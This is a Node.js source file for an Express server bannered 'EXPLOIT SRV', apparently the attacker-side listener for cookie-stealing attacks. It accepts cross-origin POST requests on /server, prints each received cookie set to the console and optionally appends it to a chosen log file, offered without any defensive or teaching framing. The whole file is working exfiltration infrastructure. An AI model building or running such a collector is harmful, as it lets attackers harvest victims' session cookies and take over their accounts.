// Importing required modules
const express = require('express');
const cors = require('cors');
const colors = require('colors');
const fs = require('fs');
const readline = require('readline');

// Function to display a colored banner
function displayBanner() {
  // ASCII art banner
  const banner = `
███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗    ███████╗██████╗ ██╗   ██╗
██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝    ██╔════╝██╔══██╗██║   ██║
█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║       ███████╗██████╔╝██║   ██║
██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║       ╚════██║██╔══██╗╚██╗ ██╔╝
███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║       ███████║██║  ██║ ╚████╔╝ 
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝       ╚══════╝╚═╝  ╚═╝  ╚═══╝  
                                                        by Oziesiek	`;

  // Displaying the banner in red color
  console.log(colors.red(banner));
}

// Display the banner at the beginning
displayBanner();

// Creating an Express app
const app = express();

// Enabling CORS with specified origin and credentials
app.use(cors({
  origin: 'http://0.0.0.0:8000',
  credentials: true
}));

// Parsing JSON request bodies
app.use(express.json());

// Handling POST requests to /server route
app.post('/server', (req, res) => {
  // Logging received cookies to console
  console.log(colors.yellow('[+] Received cookies:'), req.body);
  // Logging received cookies to file if specified
  logToFile('[+] Received cookies: ' + JSON.stringify(req.body));
  // Sending response to the client
  res.send('Cookies received successfully');
});

// Setting the server port
const port = 3000;

// Starting the server and listening on the specified port
app.listen(port, () => {
  // Logging server start information to console
  console.log(colors.green(`Server is running, listening on ${port}`));
  // Prompting for logging preferences when server starts
  promptForLogging();
});

// Function to prompt for logging preferences
function promptForLogging() {
  // Creating an interface for readline
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  // Asking the user if they want to log to a file
  rl.question('Do you want to log to a file? (yes/no): ', (answer) => {
    // Handling user response
    if (answer.toLowerCase() === 'yes') {
      // If user wants to log to a file, ask for file name
      rl.question('Enter the file name: ', (fileName) => {
        // Store the file name for logging
        global.logFileName = fileName;
        // Confirm logging to the user
        console.log(`Logging to file ${fileName}`);
        // Close the readline interface
        rl.close();
      });
    } else {
      // If user doesn't want to log to a file, simply close the readline interface
      rl.close();
    }
  });
}

// Function to log message to file
function logToFile(message) {
  // Checking if global log file name is specified
  if (global.logFileName) {
    // If log file name is specified, append message to the file
    fs.appendFile(global.logFileName, message + '\n', (err) => {
      // Log any error occurred while writing to the file
      if (err) {
        console.error('Error logging to file:', err);
      }
    });
  }
}
